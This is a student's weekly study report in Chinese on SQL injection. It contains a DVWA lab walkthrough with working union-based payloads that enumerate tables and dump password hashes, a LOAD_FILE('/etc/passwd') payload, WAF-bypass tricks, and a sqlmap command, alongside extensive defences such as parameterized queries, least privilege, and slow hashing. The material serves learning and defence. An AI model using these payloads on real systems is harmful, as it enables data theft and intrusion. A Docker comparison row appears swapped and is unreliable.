+++
date = '2026-10-04T15:44:00+08:00'
draft = false
title = 'web第二周周报'
tags = ['web','web安全的核心基础漏洞','SQL注入']
categories = ['Linux基础']
+++

## 目录

<!-- TOC -->

- [环境](#环境)
- [Docker](#docker)
- [SQL 注入](#sql-注入)
  - [注入](#注入)
  - [SQL 注入漏洞产生原因](#sql-注入漏洞产生原因)
  - [危害](#危害)
  - [如何发现](#如何发现)
  - [注入流程（含实验）](#注入流程含实验)
  - [如何防御（AI写的，目前只是理解了原理，实操感觉有点困难，正在努力理解）](#如何防御ai写的目前只是理解了原理实操感觉有点困难正在努力理解)
    - [1.参数化查询 / 预编译（根本解法）](#1参数化查询--预编译根本解法)
      - [PHP 实现](#php-实现)
      - [Python / Flask 实现](#python--flask-实现)
      - [Java 实现](#java-实现)
      - [ORM 框架](#orm-框架)
      - [无法参数化的场景](#无法参数化的场景)
    - [2. 输入验证（白名单）](#2-输入验证白名单)
      - [原则](#原则)
      - [类型强制转换](#类型强制转换)
      - [字符串参数的验证](#字符串参数的验证)
    - [2.3 转义特殊字符](#23-转义特殊字符)
      - [原理](#原理)
      - [实现](#实现)
      - [局限性](#局限性)
      - [宽字节注入](#宽字节注入)
    - [4. 数据库最小权限](#4-数据库最小权限)
      - [原则](#原则-1)
      - [危害对照](#危害对照)
      - [配置示例](#配置示例)
      - [网络层加固](#网络层加固)
      - [验证方法](#验证方法)
    - [5. 关闭错误回显](#5-关闭错误回显)
      - [风险](#风险)
      - [正确配置](#正确配置)
      - [局限性](#局限性-1)
    - [6. WAF / RASP](#6-waf--rasp)
      - [类型](#类型)
      - [常见产品](#常见产品)
      - [局限性](#局限性-2)
    - [7. 代码审计与安全测试](#7-代码审计与安全测试)
      - [源码审计](#源码审计)
      - [静态应用安全测试（SAST）](#静态应用安全测试sast)
      - [动态应用安全测试（DAST）](#动态应用安全测试dast)
      - [合法边界（重要）](#合法边界重要)
    - [3. 防御有效性验证实验（DVWA）](#3-防御有效性验证实验dvwa)
      - [实验目的](#实验目的)
      - [3.2 实验方法](#32-实验方法)
      - [3.3 测试载荷](#33-测试载荷)
      - [3.4 实验结果](#34-实验结果)
      - [3.5 各等级防御机制分析](#35-各等级防御机制分析)
      - [3.6 思考题](#36-思考题)
    - [Flask 应用加固实例](#四flask-应用加固实例)
      - [4.1 注入点修复](#41-注入点修复)
      - [4.2 密码存储加固](#42-密码存储加固)
      - [4.3 哈希算法抗破解能力对比](#43-哈希算法抗破解能力对比)
    - [防御检查清单](#五防御检查清单)
      - [5.1 代码层](#51-代码层)
      - [5.2 数据库层](#52-数据库层)
      - [5.3 配置层](#53-配置层)
      - [5.4 密码存储](#54-密码存储)
      - [5.5 运维与检测](#55-运维与检测)
      - [5.6 优先级](#56-优先级)

<!-- /TOC -->

## 环境
我用的是Kali Linux 2026.2 虚拟机（VMware）

## Docker
只是了解了一下是什么：Docker是由镜像、容器、仓库等组成的用于打包应用及其依赖，实现环境隔离与快速部署的容器化平台。下面是虚拟机和Docker的区别

| 项目 | 虚拟机 | Docker |
| ---- | ---- | ---- |
| 内核 | 独立内核 | 共享宿主机内核 |
| 镜像大小 | GB级别 | MB级别 |
| 启动速度 | 几十秒~分钟 | 秒级 |
| 资源占用 | 高 | 低 |
| 隔离强度 | 强 | 较弱 |
| 虚拟化级别 | 操作系统级 | 硬件级 |
| 比喻 | 别墅（独立水电） | 酒店的每间屋子（全部统一） |

## SQL 注入

### 注入
   注入攻击漏洞往往是应用程序缺少对输入进行安全性检查所引起的。攻击者把一些包含攻击代码当作命令或者查询语句发送给解释器这些恶意数据可以欺骗解释器，从而执行计划外的命令或者未授权访问数据

### SQL 注入漏洞产生原因
   用户输入恶意的SQL语句发给服务器，服务器接受但是没有对其进行安全性校验就直接传输到数据库执行，所以数据库就会把恶意的语句当做正常的命令，导致产生漏洞。

### 危害
   SQL注入能使攻击者绕过认证机制完全控制远程服务器上的数据库：由于SQL语法允许数据库命令和用户数据混杂在一起，所以如果开发人员不细心的话，用户数据就有可能被解释成命令，这样的话，远程用户就不仅能向web应用输入数据，而且还可以在数据库上执行任意命令了。
1. **数据泄露**
   读取用户表、订单表、管理员表、配置表、密钥表等敏感数据。

2. **认证绕过**
   通过 `OR '1'='1'`、注释符、联合查询等方式绕过登录校验。

3. **数据篡改与删除**
   修改价格、余额、权限、状态；严重时可删除表或库。

4. **权限提升**
   读取管理员凭据、修改角色字段、创建高权限用户。

5. **文件读写**
   在数据库权限和配置允许时，可能通过 `LOAD_FILE`、`INTO OUTFILE` 等读写文件。

6. **命令执行**
   在 SQL Server 等环境中，若开启 `xp_cmdshell` 等危险功能，可能进一步执行系统命令。

7. **横向移动**
   利用数据库凭据、内网连接、共享账号进一步渗透其他系统。

8. **业务中断与合规风险**
   数据被删、被加密、被勒索，或者泄露用户隐私，都会带来严重业务和合规后果。

9. **绕过风控与审计**
   注入点可能被用来篡改日志、伪造操作记录、绕过业务限制。

### 如何发现

**核心**
输入不同内容后，页面、响应时间、状态码、报错、数据量是否发生变化。
**分类**（按数据类型）
1. 数字型：输入的参数为整型，如id，年龄，页码等，无需闭合，简单说就是有且仅有0~9组成
2. 字符型：输入的参数为字符串，需要闭合

### 注入流程（含实验）

1. 寻找注入点：和数据库有交集的（注册、登录、搜索框等）   如？xx=yyyy

2. 判断有没有注入：

   | 输入框里写 | 点 Submit 后 | 分析 |
   |---|---|---|
   | `1` | `First name: admin` | 正常 |
   | **`1'`** | **报错** | SQL把 **`1'`** 当作是一个id名，但是数据库里并没有这个信息，所以报错 **证明有注入** |
   | **`1' AND '1'='1`** | **返回 admin** | 因为 **1' AND '1'='1** 整个被当做一个“名字”，所以是字符型(判断类型)
   | `1' AND '1'='2` | **空白** | 条件可控 |

3. 判断有几列(Column/Field):

   | 输入框里写 | 显示 |
   |---|---|
   | `1' ORDER BY 1 #` | 正常 |
   | **`1' ORDER BY 2 #`** | **正常** ← 至少 2 个格子 |
   | **`1' ORDER BY 3 #`** | **报错** ← ★ 所以就是 **2 个格子** |

4. 找出哪几个列能看见：
   | 输入框里写 | 显示 |
   |---|---|
   | 0' UNION SELECT 111,222 # |First name: 111  Surname: 222 |

   注：这里的0是为了让原查询空掉

5. 信息收集：

   **输入框里写：**
   ```
   0' UNION SELECT group_concat(table_name), 2 FROM information_schema.tables WHERE table_schema=database() #
   ```

   **看到：**
   ```
   First name: users
   Surname: 2
   ```
   **payload拆解：**
   | 输入 | 目的 |
   |---|---|
   | **0'** | 让原查询空掉 |
   | **UNION SELECT** | 顺便再搬这些 |
   | **group_concat(table_name)** | 把多个表拼成一个（避免只显示第一行） |
   | **2** | 第2列随便填个占位 |
   | **FROM information_schema.tables** | 从**information_schema**的表里面查找 |
   | **WHERE table_schema = database()** | 只要当前这个数据库的 |

6. 找字段：

   **输入框里写：**
   ```
   0' UNION SELECT group_concat(column_name), 2 FROM information_schema.columns WHERE table_name='users' #
   ```
   **看到：**
   ```
   First name: user_id,first_name,last_name,user,password,avatar,last_login,failed_login
   Surname: 2
   ```
**找到 `user` 和 `password` —— 这个是要偷的东西。**

7. 脱库：

   **输入框里写：**
   ```
   0' UNION SELECT group_concat(user, 0x3a, password SEPARATOR 0x0a), 2 FROM users #
   ```

   **看到：**
   ```
   First name: admin:5f4dcc3b5aa765d61d8327deb882cf99
            gordonb:e99a18c428cb38d5f260853678922e03
            1337:8d3533d75ae2c3966d7e0d4fcc69216b
            pablo:0d107d09f5bbe40cade3de5c71e9e9b7
   Surname: 2
   ```
   **payload拆解：**
   | 输入 | 目的 |
   |---|---|
   | **user,** | 第 1 个（用户名） |
   | **0x3a,** | 中间插个分隔符  0x3a 是十六进制的 ":"（冒号） |
   | **password,** |第 2 个（密码） |
    **SEPARATOR 0x0a** | 每份档案之间用  0x0a 分隔（十六进制的换行） |
   | **, 2** | 第 2 列填个占位 |
   | **FROM users** | 从 users 里搬 |

8. 密码解密:hashcat

### 如何防御（AI写的，目前只是理解了原理，实操感觉有点困难，正在努力理解）

#### 1.参数化查询 / 预编译（根本解法）

参数化查询将 SQL 语句的执行分为两个独立阶段：

1. **准备阶段（Prepare）**：数据库解析并编译 SQL 语句的结构，此时语句中的占位符位置已固定。
2. **绑定阶段（Bind）**：将用户输入作为纯数据值填入占位符。

由于语句结构在绑定之前已经编译完成，用户输入无法改变语句的语法结构。

```
准备阶段:  SELECT first_name FROM users WHERE user_id = ?
                                                      ↑ 占位符，结构已固定
绑定阶段:  参数值 = "1' OR '1'='1"
          数据库将其视为一个字符串值，而非语法片段
```

即使输入内容为 `1' OR '1'='1`，数据库也只会在 `user_id` 字段中查找
字面量为 `1' OR '1'='1` 的记录，查询结果为空。

##### PHP 实现

```php
// ❌ 错误写法：字符串拼接
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($conn, $query);

// ✅ 正确写法：预处理语句（mysqli）
$stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->bind_param("s", $id);        // "s" = string, "i" = integer, "d" = double, "b" = blob
$stmt->execute();
$result = $stmt->get_result();
while ($row = $result->fetch_assoc()) {
    // 处理结果
}
$stmt->close();
```

```php
// ✅ 正确写法：PDO（推荐，支持多种数据库）
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = :id");
$stmt->execute([':id' => $id]);
$rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
```

**bind_param 类型说明：**

| 字符 | 类型 | 适用场景 |
|---|---|---|
| `i` | integer | 数字型参数（ID、数量） |
| `d` | double | 浮点数 |
| `s` | string | 字符串（用户名、邮箱） |
| `b` | blob | 二进制数据 |

##### Python / Flask 实现

```python
# ❌ 错误写法：f-string 拼接
sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
row = conn.execute(sql).fetchone()

# ❌ 错误写法：% 格式化
sql = "SELECT * FROM users WHERE username = '%s'" % username

# ❌ 错误写法：.format()
sql = "SELECT * FROM users WHERE username = '{}'".format(username)

# ✅ 正确写法：DB-API 占位符（sqlite3 用 ?，MySQL 用 %s）
row = conn.execute(
    'SELECT * FROM users WHERE username = ? AND password = ?',
    (username, password)
).fetchone()

# ✅ 正确写法：命名占位符
row = conn.execute(
    'SELECT * FROM users WHERE username = :name',
    {'name': username}
).fetchone()
```

**⚠️ 注意：占位符必须写在 SQL 字符串内部，不能写在字符串外面。**

```python
# ❌ 错误：参数被拼进 SQL 字符串
conn.execute("SELECT * FROM users WHERE id = " + user_id)

# ❌ 错误：表名/字段名不能参数化，此处依然是拼接
conn.execute("SELECT * FROM ? WHERE id = ?", (table_name, user_id))
```

#####  Java 实现

```java
// ❌ 错误写法
Statement st = conn.createStatement();
ResultSet rs = st.executeQuery("SELECT * FROM users WHERE name = '" + name + "'");

// ✅ 正确写法：PreparedStatement
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE name = ?");
ps.setString(1, name);
ResultSet rs = ps.executeQuery();
```

#####  ORM 框架

使用 ORM 时，查询构造器默认使用参数化查询：

```python
# SQLAlchemy —— 自动参数化
User.query.filter_by(username=username).first()

# Django ORM —— 自动参数化
User.objects.filter(username=username)
```

**⚠️ 但通过 ORM 执行原生 SQL 时，风险重新出现：**

```python
# ❌ 危险：Django raw() 中使用字符串拼接
User.objects.raw(f"SELECT * FROM users WHERE name='{name}'")

# ✅ 正确：使用参数
User.objects.raw("SELECT * FROM users WHERE name=%s", [name])

# ✅ 正确：SQLAlchemy text() + 绑定参数
session.execute(text("SELECT * FROM users WHERE name = :name"), {"name": name})
```

#####  无法参数化的场景

以下部分无法使用占位符，必须采用**白名单映射**：

```python
# ❌ 错误：ORDER BY 后不能用占位符
sort = request.args.get('sort')
sql = f"SELECT * FROM posts ORDER BY {sort}"

# ✅ 正确：白名单映射
ALLOWED_SORT = {
    'date': 'created_at',
    'title': 'title',
    'views': 'view_count',
}
sort_key = request.args.get('sort', 'date')
order_column = ALLOWED_SORT.get(sort_key, 'created_at')   # 不在白名单则用默认值
sql = f"SELECT * FROM posts ORDER BY {order_column}"
```

**同类需要白名单的场景：**
- `ORDER BY` 的排序字段与方向（ASC/DESC）
- 表名、字段名（如多表切换）
- `LIMIT` / `OFFSET` 的值（可强制转换为整数）

---

#### 2. 输入验证（白名单）

#####  原则

**验证应基于白名单（允许清单），而非黑名单（禁止清单）。**

| 方式 | 逻辑 | 可靠性 | 示例 |
|---|---|---|---|
| 白名单 | 只接受已知安全的输入 | ✅ 高 | 只允许 `0-9` |
| 黑名单 | 拒绝已知危险的输入 | ❌ 低 | 过滤 `union`、`select` |

**黑名单不可靠的原因：**

| 过滤目标 | 绕过方式 |
|---|---|
| 关键字 `union` | 改变大小写 `UnIoN`、双写 `ununionion` |
| 空格 | 使用 `/**/`、`%09`(Tab)、`%0a`(换行)、括号 |
| 单引号 | 使用十六进制 `0x...`、`char()` 函数 |
| 注释符 `#` | 改用 `--`、`;%00`、`/*` |
| 关键字 `select` | 使用等价语法、编码变形 |

##### 类型强制转换

**当参数在语义上应为数字时，强制类型转换是最可靠的验证方式。**

```php
// PHP
$id = $_GET['id'];
if (!is_numeric($id)) {
    http_response_code(400);
    exit('参数错误');
}
$id = (int)$id;                          // 整数类型不包含任何 SQL 语法字符
$query = "SELECT * FROM users WHERE user_id = $id";
```

```python
# Python / Flask
user_id = request.args.get('id', '')
if not user_id.isdigit():
    abort(400, '参数错误')
user_id = int(user_id)
```

```java
// Java
int userId;
try {
    userId = Integer.parseInt(request.getParameter("id"));
} catch (NumberFormatException e) {
    response.sendError(400, "参数错误");
    return;
}
```

##### 字符串参数的验证

```python
import re

username = request.form.get('username', '')

# 白名单：只允许字母、数字、下划线，长度 3-20
if not re.fullmatch(r'[A-Za-z0-9_]{3,20}', username):
    abort(400, '用户名格式不合法')
```

**注意：输入验证是纵深防御的一环，不能替代参数化查询。**
某些业务场景下参数内容天然包含特殊字符（如搜索功能、富文本），
此时必须依赖参数化查询。

---

#### 2.3 转义特殊字符

#####  原理

通过在特殊字符前添加转义符（通常为反斜杠 `\`），使数据库将其识别为普通字符而非语法符号。

```
原始输入:  1' OR '1'='1
转义后:    1\' OR \'1\'=\'1
```

数据库接收到 `\'` 时，将其解析为字面量单引号，而非字符串结束符。

##### 实现

```php
// PHP（mysqli）
$id = mysqli_real_escape_string($conn, $_GET['id']);
$query = "SELECT * FROM users WHERE user_id = '$id'";
```

```php
// PHP（PDO）—— 使用 quote()，注意必须指定正确的字符集
$id = $pdo->quote($_GET['id']);
```

```python
# Python（MySQLdb）
import MySQLdb
escaped = conn.escape_string(user_input)
```

#####  局限性

| 局限 | 说明 |
|---|---|
| **易遗漏** | 大型项目中任意一处未转义即形成漏洞，无法通过架构保证 |
| **数据库相关** | `mysql_real_escape_string` 仅适用于 MySQL，跨数据库行为不一致 |
| **依赖字符集配置** | 字符集设置错误时可能被绕过（见下） |
| **不覆盖数字型上下文** | 若参数未用引号包裹，转义函数不生效 |
| **不覆盖非字符串位置** | `ORDER BY`、表名等位置的注入无法通过转义防护 |

##### 宽字节注入

**触发条件：** 数据库连接字符集设置为 GBK、GB2312、GB18030 等多字节字符集。

```
输入:       %df%27        （%27 是单引号 '）
转义后:     %df%5c%27     （%5c 是反斜杠 \）
```

在 GBK 编码中，`%df%5c` 构成一个合法汉字（`運`），
因此转义符 `\` 被"吃掉"，其后的 `%27` 重新成为裸露的单引号，注入成立。

**修复方式：**

```php
// 设置正确的连接字符集（使用 UTF-8 或 utf8mb4）
$conn->set_charset('utf8mb4');

// 或使用 PDO 时在 DSN 中指定
$pdo = new PDO('mysql:host=localhost;dbname=test;charset=utf8mb4', $user, $pass);
```

```sql
-- 建库时明确字符集
CREATE DATABASE myapp CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
```

**结论：转义属于补丁手段，参数化查询才是结构性解决方案。**

---

#### 4. 数据库最小权限

##### 原则

应用程序连接数据库所使用的账号，应仅具备完成业务所需的**最小权限集合**。

##### 危害对照

| 数据库权限 | 被注入后可执行的操作 |
|---|---|
| `SELECT` | 读取授权库表的数据 |
| `INSERT` / `UPDATE` / `DELETE` | 篡改或删除数据 |
| `FILE` | `LOAD_FILE()` 读取服务器任意文件；`INTO OUTFILE` 写入 WebShell |
| `DROP` | `DROP TABLE`、`DROP DATABASE` 破坏数据 |
| `CREATE` | 创建表、写入数据 |
| `GRANT OPTION` | 为自身或他人授予权限，实现权限持久化 |
| `SUPER` | 修改全局变量、提权 |
| `PROCESS` | 查看其他会话执行的语句 |
| 无上述权限，仅 `SELECT` | 仅能读取当前库的有限数据 |

#####  配置示例

```sql
-- ❌ 错误做法：应用使用 root 连接数据库

-- ✅ 正确做法：创建专用账号并授予最小权限
CREATE DATABASE myapp CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;

CREATE USER 'webapp'@'localhost' IDENTIFIED BY '<强随机密码>';

GRANT SELECT, INSERT, UPDATE, DELETE ON myapp.* TO 'webapp'@'localhost';

-- 明确不授予以下权限：
--   FILE, CREATE, DROP, ALTER, INDEX, GRANT OPTION, SUPER, PROCESS

FLUSH PRIVILEGES;

-- 验证权限
SHOW GRANTS FOR 'webapp'@'localhost';
```

##### 网络层加固

```
· 数据库监听地址绑定 127.0.0.1 或内网地址，不暴露到公网
· 数据库端口（3306/5432/1433）不对外开放
· 应用与数据库之间使用独立网段或 TLS 加密连接
· 仅允许应用服务器 IP 访问数据库
```

##### 验证方法

在测试环境的注入点执行以下语句，观察是否报权限错误：

```sql
-- 测试是否具有 FILE 权限
0' UNION SELECT LOAD_FILE('/etc/passwd'), 2 #

-- 测试是否可读当前数据库用户权限
0' UNION SELECT grantee, privilege_type FROM information_schema.user_privileges LIMIT 0,1 #
```

若返回权限相关错误，说明权限配置正确。

---

#### 5. 关闭错误回显

##### 风险

数据库错误信息通常包含：

- SQL 语句片段
- 表名、字段名
- 数据库类型与版本
- 文件路径

这些信息可直接用于构造更精准的攻击载荷。

```php
// ❌ 错误：将数据库错误直接返回给客户端
if (!$result) {
    die("Query failed: " . mysqli_error($conn));
}
```

**返回内容示例：**

```
Query failed: You have an error in your SQL syntax; check the manual
that corresponds to your MariaDB server version for the right syntax
to use near ''1'' OR '1'='1''' at line 1
```

攻击者可据此推断：参数由单引号包裹、数据库为 MariaDB。

##### 正确配置

```php
// ✅ 正确：详细信息记录到日志，客户端仅收到通用提示
if (!$result) {
    error_log(sprintf(
        '[SQL_ERROR] uri=%s sql=%s error=%s',
        $_SERVER['REQUEST_URI'],
        $query,
        mysqli_error($conn)
    ));
    http_response_code(500);
    exit('系统繁忙，请稍后重试');
}
```

```ini
; php.ini —— 生产环境配置
display_errors = Off
display_startup_errors = Off
log_errors = On
error_log = /var/log/php/error.log
```

```nginx
# Nginx：自定义错误页面
error_page 500 502 503 504 /50x.html;
```

##### 局限性

关闭错误回显**不能阻止注入**，只会将攻击方式从
「报错注入（Error-based）」转变为「盲注（Blind）」：

- **布尔盲注**：通过页面返回内容的差异判断条件真假
- **时间盲注**：通过响应时间差异判断条件真假

盲注同样可以完成数据提取，只是耗时更长。因此该项只能作为辅助手段。

---

#### 6. WAF / RASP

##### 类型

| 类型 | 全称 | 位置 | 作用 |
|---|---|---|---|
| WAF | Web Application Firewall | 流量入口 | 基于规则/特征拦截恶意请求 |
| RASP | Runtime Application Self-Protection | 应用运行时 | 在应用内部检测并阻断危险调用 |

##### 常见产品

| 产品 | 类型 | 说明 |
|---|---|---|
| ModSecurity + OWASP CRS | 开源 WAF | 可集成至 Nginx / Apache |
| 云 WAF | 云服务 | 阿里云、腾讯云、Cloudflare 等 |
| 长亭雷池（SafeLine） | 开源 WAF | 国产，部署简单 |
| OpenRASP | 开源 RASP | 需在应用中集成 Agent |

##### 局限性

WAF 基于规则匹配，存在多种绕过方式：

| 绕过类型 | 说明 |
|---|---|
| 编码绕过 | URL 编码、Unicode 编码、十六进制编码、Base64 |
| 大小写混写 | `UnIoN SeLeCt` |
| 注释分割 | `un/**/ion sel/**/ect` |
| 等价替换 | 使用 `&&` 替代 `AND`，`||` 替代 `OR` |
| 分块传输 | `Transfer-Encoding: chunked` 拆分载荷 |
| 参数污染 | 提交同名参数多次（HPP） |
| 宽字符/畸形编码 | 利用解析器差异 |

**结论：WAF 是缓解措施，用于降低自动化扫描的成功率、争取修复时间，
不能替代代码层的参数化查询。**

---

#### 7. 代码审计与安全测试

##### 源码审计

**搜索危险模式：**

```bash
# 搜索字符串拼接 SQL
grep -rn --include=*.py -E 'f"[^"]*SELECT|f'"'"'[^'"'"']*SELECT' .
grep -rn --include=*.py -E '"\s*\+\s*.*SELECT|SELECT.*"\s*\+' .
grep -rn --include=*.php -E '\$query\s*=\s*"[^"]*\$' .
grep -rn --include=*.java -E 'executeQuery\([^)]*\+' .

# 搜索格式化函数
grep -rn -E '\.format\(.*SELECT|%\s*\(.*SELECT' .
```

**审计清单：**

- [ ] 所有 SQL 语句是否使用参数化占位符
- [ ] 是否存在字符串拼接（`+`、`f""`、`.format()`、`%`）
- [ ] `ORDER BY` / `GROUP BY` / 表名是否使用白名单映射
- [ ] ORM 的 `raw()` / `execute()` 原生 SQL 是否参数化
- [ ] 拼接的变量是否可被用户控制（需追溯数据流）

##### 静态应用安全测试（SAST）

| 工具 | 语言 | 说明 |
|---|---|---|
| Semgrep | 多语言 | 规则可自定义，速度快 |
| CodeQL | 多语言 | GitHub 提供，支持数据流分析 |
| SonarQube | 多语言 | 集成 CI/CD |
| Bandit | Python | Python 专用 |

```bash
# Semgrep 示例
semgrep --config "p/sql-injection" ./src

# Bandit 示例
bandit -r ./app
```

##### 动态应用安全测试（DAST）

```bash
# sqlmap 检测（仅限已授权目标）
sqlmap -u "http://target/vuln.php?id=1" \
       --cookie="PHPSESSID=xxx; security=low" \
       --batch --dbs

# OWASP ZAP
zap-cli quick-scan -s all http://target/
```

##### 合法边界（重要）

```
《中华人民共和国刑法》第二百八十五条 非法侵入计算机信息系统罪
《中华人民共和国网络安全法》第二十七条 禁止非法侵入他人网络

允许测试的目标：
  ✅ 自行搭建的靶场（DVWA、sqli-labs 等）
  ✅ 取得书面授权的目标（授权测试、SRC 项目）
  ✅ 学校/单位提供的实验环境

禁止测试的目标：
  ❌ 任何未授权的第三方系统
```

---

#### 3. 防御有效性验证实验（DVWA）

##### 实验目的

通过在 DVWA 四个安全等级下执行相同载荷，观察防御措施的实际效果。

##### 3.2 实验方法

1. 登录 DVWA（`admin` / `password`）
2. 进入 `DVWA Security`，切换安全等级
3. 进入 `SQL Injection` 模块，提交测试载荷
4. 记录返回结果

##### 3.3 测试载荷

| 编号 | 载荷 | 类型 |
|---|---|---|
| A | `1' OR '1'='1` | 字符型布尔注入 |
| B | `1' UNION SELECT user, password FROM users #` | 联合查询注入 |
| C | `1 OR 1=1` | 数字型注入 |
| D | `0' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database() #` | 信息收集 |

##### 3.4 实验结果

| 载荷 | Low | Medium | High | Impossible |
|---|---|---|---|---|
| A | 成功 | 失败 | 失败 | 失败 |
| B | 成功 | 失败 | 失败 | 失败 |
| C | 失败 | **成功** | 失败 | 失败 |
| D | 成功 | 失败 | 失败 | 失败 |

##### 3.5 各等级防御机制分析

| 等级 | 实现方式 | 防护效果 |
|---|---|---|
| **Low** | 无任何过滤，直接拼接 | 完全可注入 |
| **Medium** | `mysqli_real_escape_string()` + `str_replace` 过滤 `<script>`；<br>参数为数字型（未使用引号包裹） | 字符型注入失效；<br>数字型注入仍可成功（载荷 C） |
| **High** | `mysqli_real_escape_string()` + 输入长度限制（`LIMIT 1`） | 注入难度提升；<br>联合查询受 `LIMIT 1` 限制，仅能返回一行 |
| **Impossible** | `stripslashes()` + `mysqli_real_escape_string()` + `is_numeric()` 类型校验；<br>**并使用参数化查询** | 无法注入 |

**关键结论：**

1. Medium 等级的失败说明「仅转义」不足以防住数字型上下文
2. High 等级的 `LIMIT 1` 说明「限制返回行数」只能降低数据泄露量，不能阻止注入
3. 只有 Impossible 等级的参数化查询实现了根本性防护

##### 3.6 思考题

1. 为什么 Medium 等级下载荷 C（`1 OR 1=1`）反而成功，而载荷 A 失败？
2. `LIMIT 1` 能阻止数据泄露吗？攻击者如何绕过？
3. 若在 Medium 等级的参数上增加引号包裹，载荷 C 是否仍然有效？
4. 参数化查询为什么能同时防住所有四种载荷？

---

#### 四、Flask 应用加固实例

##### 4.1 注入点修复

```python
# ❌ 修复前：字符串拼接
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    conn = get_db()
    sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    row = conn.execute(sql).fetchone()

    if row:
        session['user'] = row['username']
        return redirect('/welcome')
    return render_template('login.html', error='用户名或密码错误')
```

**该代码的利用方式：**

```
用户名: admin' --
密码:   （任意值）

生成 SQL:
SELECT * FROM users WHERE username = 'admin' --' AND password = '任意值'
                                          ↑ 后续条件被注释
```

```python
# ✅ 修复后：参数化查询
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    conn = get_db()
    row = conn.execute(
        'SELECT * FROM users WHERE username = ? AND password = ?',
        (username, password)
    ).fetchone()

    if row:
        session['user'] = row['username']
        return redirect('/welcome')
    return render_template('login.html', error='用户名或密码错误')
```

##### 4.2 密码存储加固

```python
# ❌ 当前实现：明文存储 + 明文比对
row = conn.execute(
    'SELECT * FROM users WHERE username = ? AND password = ?',
    (username, password)
).fetchone()
```

**风险：** 数据库泄露即等同于密码泄露。

```python
# ✅ 加固方案：慢哈希 + 盐值
from werkzeug.security import generate_password_hash, check_password_hash

# 注册
@app.route('/register', methods=['POST'])
def register():
    username = request.form['username']
    password = request.form['password']

    hashed = generate_password_hash(
        password,
        method='scrypt',      # 可选 pbkdf2 / scrypt / argon2
        salt_length=16
    )
    conn = get_db()
    conn.execute(
        'INSERT INTO users (username, password) VALUES (?, ?)',
        (username, hashed)
    )
    conn.commit()
    return redirect('/login')

# 登录
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    conn = get_db()
    user = conn.execute(
        'SELECT * FROM users WHERE username = ?',
        (username,)
    ).fetchone()

    if user and check_password_hash(user['password'], password):
        session['user'] = user['username']
        return redirect('/welcome')
    return render_template('login.html', error='用户名或密码错误')
```

##### 4.3 哈希算法抗破解能力对比

在 NVIDIA RTX 5060 Laptop GPU + hashcat 7.1.2 环境下的实测数据：

| 算法 | hashcat `-m` | 实测速度 | 相对 MD5 |
|---|---|---|---|
| NTLM | 1000 | 46,382.0 MH/s | 快 1.7 倍 |
| MD5 | 0 | 27,346.8 MH/s | 基准 |
| SHA1 | 100 | 9,532.7 MH/s | 慢 2.9 倍 |
| bcrypt | 3200 | 36,990 H/s | 慢约 74 万倍 |

**同等密码强度下的破解耗时对比：**

| 密码空间 | MD5 | bcrypt |
|---|---|---|
| 8 位纯数字（10⁸） | 0.004 秒 | 45 分钟 |
| 10 位纯数字（10¹⁰） | 0.37 秒 | 31 天 |
| 8 位小写字母（26⁸） | 7.6 秒 | 1.8 年 |
| 6 位大小写+数字（62⁶） | 2 秒 | 178 天 |
| 12 位大小写+数字（62¹²） | 约 5 天 | 数百万年 |

**结论：**

1. MD5 / SHA1 设计目标是计算快速，不适合用于密码存储
2. 密码存储应使用 bcrypt / scrypt / argon2 等可调工作因子的慢哈希算法
3. 必须为每个用户生成独立随机盐值，防止彩虹表与批量破解
4. 密码长度对安全性的贡献大于字符集复杂度

---

#### 五、防御检查清单

##### 5.1 代码层

- [ ] 所有数据库查询均使用参数化占位符
- [ ] 不存在以下拼接模式：
  - Python：`f"SELECT`、`'...' + var`、`.format(`、`% var`
  - PHP：`"$query ... $var"`、`. $var .`
  - Java：`"..." + var`
- [ ] `ORDER BY` / `GROUP BY` / 表名 / 字段名使用白名单映射
- [ ] `LIMIT` / `OFFSET` 的值已强制转换为整数
- [ ] ORM 的原生 SQL 接口（`raw()`、`text()`）已使用绑定参数
- [ ] 涉及动态 SQL 的功能已通过代码评审

##### 5.2 数据库层

- [ ] 应用使用专用账号，非 `root` / `sa` / `postgres`
- [ ] 该账号仅具备必要的 `SELECT` / `INSERT` / `UPDATE` / `DELETE`
- [ ] 未授予 `FILE`、`DROP`、`CREATE`、`GRANT OPTION`、`SUPER`
- [ ] 连接字符集明确设置为 `utf8mb4`
- [ ] 数据库端口未暴露至公网
- [ ] 已通过 `SHOW GRANTS` 验证权限

##### 5.3 配置层

- [ ] 生产环境 `display_errors = Off`
- [ ] `log_errors = On` 且日志落盘
- [ ] 框架调试模式（`DEBUG`）已关闭
- [ ] 自定义错误页面已配置
- [ ] 错误信息不包含 SQL 语句、表名、字段名、路径

##### 5.4 密码存储

- [ ] 密码非明文存储
- [ ] 未使用 MD5 / SHA1
- [ ] 使用 bcrypt / scrypt / argon2
- [ ] 每个用户具有独立随机盐值
- [ ] 工作因子（cost）符合当前硬件水平（bcrypt cost ≥ 10）

##### 5.5 运维与检测

- [ ] 已部署 WAF（或至少具备基础流量过滤）
- [ ] 数据库慢查询/异常查询有监控告警
- [ ] 已配置 SAST 工具并接入 CI
- [ ] 上线前执行过 DAST 扫描
- [ ] 第三方依赖定期审计（`pip audit` / `npm audit`）
- [ ] 建立了漏洞响应与修复流程

##### 5.6 优先级

```
必须完成（缺失即为高危）：
  1. 所有 SQL 使用参数化查询
  2. 数据库账号最小权限
  3. 密码使用慢哈希 + 盐值存储

强烈建议：
  4. 输入验证（白名单 / 类型转换）
  5. 生产环境关闭错误回显

按需部署：
  6. WAF / RASP
  7. 代码审计与自动化测试
```
